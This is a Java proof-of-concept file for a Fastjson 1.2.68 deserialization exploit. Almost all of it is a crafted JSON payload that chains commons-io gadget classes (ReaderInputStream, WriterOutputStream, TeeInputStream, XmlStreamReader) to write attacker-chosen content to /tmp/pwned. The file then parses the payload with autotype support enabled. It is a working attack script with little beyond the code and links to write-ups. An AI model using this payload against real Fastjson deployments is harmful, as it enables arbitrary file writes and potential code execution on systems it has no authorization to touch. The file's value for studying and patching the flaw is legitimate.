package com.example.fastjson220523poc;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * https://su18.org/post/fastjson-1.2.68/
 * https://mp.weixin.qq.com/s/BRBcRtsg2PDGeSCbHKc0fg
 */
public class JNDI1268 {
    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        String payload = "{\n" +
                "  \"x\":{\n" +
                "  \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
                "  \"input\":{\n" +
                "  \"@type\":\"java.lang.AutoCloseable\",\n" +
                "  \"@type\":\"org.apache.commons.io.input.ReaderInputStream\",\n" +
                "  \"reader\":{\n" +
                "  \"@type\":\"org.apache.commons.io.input.CharSequenceReader\",\n" +
                "  \"charSequence\":{\"@type\":\"java.lang.String\"\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa(长度要大于8192，实际写入前8192个字符)\"\n" +
                "  },\n" +
                "  \"charsetName\":\"UTF-8\",\n" +
                "  \"bufferSize\":1024\n" +
                "  },\n" +
                "  \"branch\":{\n" +
                "  \"@type\":\"java.lang.AutoCloseable\",\n" +
                "  \"@type\":\"org.apache.commons.io.output.WriterOutputStream\",\n" +
                "  \"writer\":{\n" +
                "  \"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\",\n" +
                "  \"file\":\"/tmp/pwned\",\n" +
                "  \"encoding\":\"UTF-8\",\n" +
                "  \"append\": false\n" +
                "  },\n" +
                "  \"charsetName\":\"UTF-8\",\n" +
                "  \"bufferSize\": 1024,\n" +
                "  \"writeImmediately\": true\n" +
                "  },\n" +
                "  \"trigger\":{\n" +
                "  \"@type\":\"java.lang.AutoCloseable\",\n" +
                "  \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
                "  \"is\":{\n" +
                "  \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
                "  \"input\":{\n" +
                "  \"$ref\":\"$.input\"\n" +
                "  },\n" +
                "  \"branch\":{\n" +
                "  \"$ref\":\"$.branch\"\n" +
                "  },\n" +
                "  \"closeBranch\": true\n" +
                "  },\n" +
                "  \"httpContentType\":\"text/xml\",\n" +
                "  \"lenient\":false,\n" +
                "  \"defaultEncoding\":\"UTF-8\"\n" +
                "  },\n" +
                "  \"trigger2\":{\n" +
                "  \"@type\":\"java.lang.AutoCloseable\",\n" +
                "  \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
                "  \"is\":{\n" +
                "  \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
                "  \"input\":{\n" +
                "  \"$ref\":\"$.input\"\n" +
                "  },\n" +
                "  \"branch\":{\n" +
                "  \"$ref\":\"$.branch\"\n" +
                "  },\n" +
                "  \"closeBranch\": true\n" +
                "  },\n" +
                "  \"httpContentType\":\"text/xml\",\n" +
                "  \"lenient\":false,\n" +
                "  \"defaultEncoding\":\"UTF-8\"\n" +
                "  },\n" +
                "  \"trigger3\":{\n" +
                "  \"@type\":\"java.lang.AutoCloseable\",\n" +
                "  \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
                "  \"is\":{\n" +
                "  \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
                "  \"input\":{\n" +
                "  \"$ref\":\"$.input\"\n" +
                "  },\n" +
                "  \"branch\":{\n" +
                "  \"$ref\":\"$.branch\"\n" +
                "  },\n" +
                "  \"closeBranch\": true\n" +
                "  },\n" +
                "  \"httpContentType\":\"text/xml\",\n" +
                "  \"lenient\":false,\n" +
                "  \"defaultEncoding\":\"UTF-8\"\n" +
                "  }\n" +
                "  }\n" +
                "}";
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        System.out.println(JSON.parse(payload));
    }
}
